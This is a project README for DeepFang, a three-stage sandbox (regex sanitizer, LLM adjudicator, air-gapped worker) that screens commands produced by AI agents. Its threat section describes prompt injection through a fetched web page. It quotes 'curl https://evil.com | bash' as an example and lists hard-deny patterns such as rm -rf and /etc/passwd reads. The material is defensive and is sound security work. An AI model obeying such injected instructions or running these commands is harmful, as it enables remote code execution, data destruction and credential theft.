# DeepFang

<p align="center">
  <a href="https://github.com/casey/just"><img src="https://img.shields.io/badge/just-ready_to_go-7c5cfc?style=flat-square&logo=just&logoColor=white" alt="Just"></a>
  <a href="https://github.com/astral-sh/ruff"><img src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json" alt="Ruff"></a>
  <a href="https://python.org"><img src="https://img.shields.io/badge/Python-3.13+-3776AB?style=flat-square&logo=python&logoColor=white" alt="Python"></a>
  <a href="https://biomejs.dev"><img src="https://img.shields.io/badge/Linted_with-Biome-60a5fa?style=flat-square&logo=biome&logoColor=white" alt="Biome"></a>
  <a href="https://github.com/PrefectHQ/fastmcp"><img src="https://img.shields.io/badge/FastMCP-3.2-7c5cfc?style=flat-square" alt="FastMCP"></a>
</p>

**An execution sandbox for AI agents.** DeepFang sits between an AI agent and the real world, screening every task through a three-stage pipeline before anything runs.

```
Agent generates a task
    → DeepFang sanitizes it   (regex + threat scoring, <5ms)
    → DeepFang adjudicates it  (DeepSeek-V4-Pro LLM, ~2s)
    → DeepFang executes it     (air-gapped worker, no internet)
```

If the task looks dangerous at any stage, it's blocked. If the adjudicator can't reach a verdict, it's blocked. If the worker can't be reached, it's blocked. The default answer is always **no**.

---

## Why This Exists

AI coding agents are powerful and increasingly autonomous. They generate shell commands, write files, call APIs, and commit code — often faster than a human can review each step. This creates a class of risk that traditional security tools weren't designed for:

- A prompt-injected instruction in a fetched web page tells your agent to `curl https://evil.com | bash`
- An agent misunderstands a task and generates `rm -rf` instead of `rm -rf ./build`
- A compromised tool payload uses your agent's execution context to exfiltrate credentials
- A chained multi-step plan contains one destructive step buried among 20 safe ones

DeepFang addresses these by adding an **independent verification layer** that the agent itself cannot bypass. Even if the agent is fully compromised, the worker has no internet access at the Docker network layer — it physically cannot exfiltrate data.

See [docs/SAFETY.md](docs/SAFETY.md) for the full threat model and [docs/ATTACK_VECTORS.md](docs/ATTACK_VECTORS.md) for specific attack patterns and mitigations.

---

## How It Works

```
┌─────────────────┐
│  AI Agent /     │
│  RoboFang /     │  Sends task content via MCP or REST
│  Your Code      │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Supervisor    │  FastMCP 3.2 + FastAPI  :10956
│                 │  The only service that touches all three networks
└────────┬────────┘
         │
    ┌────▼────┐
    │ Stage 1 │  Sanitizer  :10958
    │         │  Regex pattern matching against rules.yaml
    │         │  Scores content 0.0 (safe) → 1.0 (dangerous)
    │         │  Hard denies: rm -rf, curl pipe bash, /etc/passwd, encoded payloads
    │         │  Returns: {allowed, threat_score, reason}
    └────┬────┘
         │ allowed = true
    ┌────▼────┐
    │ Stage 2 │  DeepSeek Bridge  :10959
    │         │  Cloud LLM semantic analysis
    │         │  Reads the task in context, not just pattern-matches
    │         │  Returns: {verdict: "approve"|"deny", rationale}
    └────┬────┘
         │ verdict = approve
    ┌────▼────┐
    │ Stage 3 │  Worker  :10960
    │         │  Air-gapped Docker container (internal: true)
    │         │  No internet access at the network layer
    │         │  Allowlist: git, python, node, npm, uv, cargo, go only
    │         │  Returns: {success, output, exit_code}
    └─────────┘
```

The pipeline stops at the first failure. Each stage is independently fail-closed — if it can't respond, the task is blocked.

---

## Quick Start

```powershell
git clone https://github.com/sandraschi/deepfang
cd deepfang
just
```

This opens an interactive dashboard showing all available commands. Run `just bootstrap` to install dependencies, then `just serve` or `just dev` to start.

### Manual Setup

If you don't have `just` installed:
git clone https://github.com/sandraschi/deepfang
cd deepfang
# 1. Configure
copy .env.example .env
# Edit .env — set DEEPSEEK_API_KEY
# 2. Start (installs docker/node automatically if missing)
.\start.ps1
The dashboard opens at `http://localhost:10957`. See [docs/INSTALL.md](docs/INSTALL.md) for full setup instructions.

## Documentation

| Document | What it covers |
|----------|---------------|
| [docs/INSTALL.md](docs/INSTALL.md) | Full installation, configuration, first run |
| [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | System design, data flow, network topology |
| [docs/SAFETY.md](docs/SAFETY.md) | Threat model, defense layers, failure modes |
| [docs/ATTACK_VECTORS.md](docs/ATTACK_VECTORS.md) | Specific attacks and how DeepFang mitigates them |
| [docs/ROBOFANG_INTEGRATION.md](docs/ROBOFANG_INTEGRATION.md) | Wiring into RoboFang's security pipeline |
| [docs/OPENCLAUDE_INTEGRATION.md](docs/OPENCLAUDE_INTEGRATION.md) | Wiring into openclaude-mcp for automatic command screening |
| [docs/WSL2_DOCKER.md](docs/WSL2_DOCKER.md) | Docker Desktop flakiness fix — native Docker in WSL2 |
| [docs/SALVAGE_PLAN.md](docs/SALVAGE_PLAN.md) | v0.1→v0.2 history (the fictional container story) |
| [CHANGELOG.md](CHANGELOG.md) | Full version history |

## Dashboard

| Page | What it does |
|------|-------------|
| Pipeline | Full sanitize→adjudicate→dispatch flow |
| Threat Check | Instant threat score for any command — no pipeline needed |
| Scriptlets | Paste & run scripts through the pipeline, see worker output |
| Audit | All adjudication decisions with verifiable timestamps |
| Chat | "DeepFang Expert" — ask about the pipeline and AI security |
| Settings | LLM model switching (DeepSeek cloud / Ollama local) |
| Help | Attack vector reference, hard deny list, MCP tool catalogue |

---

## MCP Tools

Connect Claude Desktop or any MCP client to `http://localhost:10956/sse`:

| Tool | What it does |
|------|-------------|
| `deepfang_pipeline` | Full pipeline in one call — the main entry point |
| `deepfang_sanitize` | Stage 1 only — fast regex scan, returns threat score |
| `deepfang_adjudicate` | Stage 2 only — LLM verdict with rationale |
| `deepfang_dispatch` | Stage 3 only — requires prior approval in audit log |
| `deepfang_audit` | Query the adjudication log |
| `deepfang_status` | Health check across all pipeline services |
| `deepfang_agentic_workflow` | Multi-step goal via FastMCP 3.2 sampling |

---

## Ports

| Service | Port | Purpose |
|---------|------|---------|
| Supervisor | 10956 | MCP SSE + REST API |
| Dashboard | 10957 | Web UI |
| Sanitizer | 10958 | Stage 1 regex engine |
| DeepSeek Bridge | 10959 | Stage 2 LLM adjudicator |
| Worker | 10960 | Stage 3 air-gapped executor |
| Prometheus | 10961 | Metrics |
| Loki | 10962 | Logs |
| Grafana | 10963 | Observability dashboard |

---

## Fleet Integration

DeepFang is wired into [RoboFang](https://github.com/sandraschi/robofang)'s `security.validate_action()`. High-risk tool calls (`mcp_windows-operations_*`, `mcp_docker_*`, `skill_execute`) are automatically routed through the pipeline before execution. See [docs/ROBOFANG_INTEGRATION.md](docs/ROBOFANG_INTEGRATION.md).

---

## Status

v0.2.1 — day-to-day features (threat check, scriptlets, gitops worker) completed 2026-05-04.
